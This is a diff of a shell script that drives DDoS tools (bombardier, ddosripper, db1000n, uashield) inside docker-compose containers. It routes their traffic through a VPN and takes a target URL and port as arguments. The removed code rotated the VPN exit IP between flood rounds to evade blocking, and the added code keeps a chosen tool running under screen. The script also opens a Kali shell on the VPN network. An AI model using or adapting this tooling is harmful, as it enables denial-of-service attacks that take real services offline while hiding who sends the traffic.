@@ -1,12 +1,18 @@
 #!/bin/sh
 
-init(){
-    export VPN_USER=$3
-    export VPN_CODE=$4
-    export VPN_COUNTRY=$6
-    export VPN_TYPE=$5
-    export VPN_SERVER_HOSTNAMES=$7
-    export VPN_PROTOCOL=${8:-udp}
+initVPN(){
+    export VPN_USER=$1
+    export VPN_CODE=$2
+    export VPN_TYPE=$3
+    export VPN_COUNTRY=$4
+    export VPN_SERVER_HOSTNAMES=$5
+    export VPN_PROTOCOL=${6:-udp}
+    keyFolderPath=$7
+    if [[ !  $keyFolderPath -eq "" ]]
+        echo "Downloading key file from $keyFolderPath"
+    fi
+}
+initTarget(){
     export TARGET_PORT=$2
     export R_TARGET_URL=$1
     export RUN_RIPPER=1
@@ -27,61 +33,20 @@ init(){
 }
 start_vpn(){
     sudo -E docker-compose down
-    sudo -E docker-compose up -d --force-recreate vpn
+    sudo -E docker-compose up -d --force-recreate vpn refresher
     sleep 10s
-    sudo docker logs $(sudo docker-compose ps -q vpn)
+    sudo docker-compose logs
     sudo -E docker-compose run --rm test
-}
-kali(){
-    start_vpn
-    sudo docker run --net=container:runner_vpn_1 -ti --rm local/kali bash
-}
-change_ip(){
-    sudo -E docker-compose run --rm --entrypoint "curl http://0.0.0.0:8000/openvpn/actions/restart" test
-    echo "IP changed"
-    sleep 7s
-    sudo -E docker-compose run --rm test
-}
-runAll(){
-    start_vpn
-    echo "Executing..."
-    if [ $RUN_RIPPER -eq 1 ]
-    then
-        sudo -E docker-compose run -d ddosripper
-    fi
-    sleep 10s
-    echo "Logs:"
-    sudo docker logs --since 20s $(sudo docker-compose ps -q ddosripper)
-    for i in {1..60}
-    do
-        echo "Running all $i time. U=$VPN_USER C=$VPN_CODE C=$VPN_COUNTRY $B_TARGET_URL $R_TARGET_URL"
-        sudo -E docker-compose run -d --rm bombardier
-        sleep 120s
-        change_ip
-        echo "Logs:"
-        sudo docker logs --since 30s $(sudo docker-compose ps -q ddosripper)
-    done
 }
 run(){
     tool=$1
-    sleep=${2:-30}
-    sleepTimes=${3:-10}
     start_vpn
-    sudo -E docker-compose run -d $tool 
-    echo "Executing $tool..."
-    sleep 10s
-    sudo docker logs $(sudo docker-compose ps -q $tool)
-    for (( i=1; i<=$sleepTimes; i++ ))
+    sudo rm -f "$tool.log"
+    sudo -E screen -dm -S tool -L -Logfile "$tool.log" -E docker-compose up $tool
+    while true
     do
-        echo "Logs: since 10s $(date)"
-        sudo docker logs --since 10s $(sudo docker-compose ps -q $tool)
-        for j in {1..10}
-        do
-            sleep "${sleep}s"
-            echo "Logs sinse ${sleep} $(date)"
-            sudo docker logs --since "${sleep}s" $(sudo docker-compose ps -q $tool)
-        done
-        change_ip
+        tail 10 "$tool.log"
+        sleep 30s
     done
 }
 uashield() {
@@ -89,10 +54,12 @@ uashield() {
 }
 bombardier()
 {
+    initTarget $1 $2
     run "bombardier"
 }
 ddosripper()
 {
+    initTarget $1 $2
     run "ddosripper"
 }
 checksites(){
@@ -102,6 +69,10 @@ checksites(){
 db1000n(){
     sudo -E docker-compose pull db1000n
     run "db1000n" 30 10000
+}
+kali(){
+    start_vpn
+    sudo docker run --net=container:runner_vpn_1 -ti --rm local/kali bash
 }
 cls(){
     sudo docker container ls
